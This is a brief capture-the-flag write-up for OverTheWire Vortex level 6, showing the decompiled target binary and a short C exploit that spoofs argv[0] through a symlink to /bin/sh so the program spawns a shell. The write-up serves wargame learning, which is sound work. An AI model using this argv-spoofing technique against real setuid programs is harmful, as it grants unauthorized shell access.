# Overthewire Vortex Level 6 Writeup

Given an ELF file. You can disassemble it by hand or use modern tools like IDA.

```c
//----- (0804847D) --------------------------------------------------------
int __cdecl restart(char *file)
{
  return execlp(file, file, 0);
}

//----- (0804849F) --------------------------------------------------------
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  if ( *envp )
    restart((char *)*argv);
  printf(envp[3]);
  _exit(29477);
}
```

And then make a soft link to `/bin/sh` and pass it to the program you want to exploit.

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
        char * envp[] = {"", NULL};
        char * argv[] = {"./exploit", NULL};
        execve("/vortex/vortex6", argv, envp);
        return 0;
}
```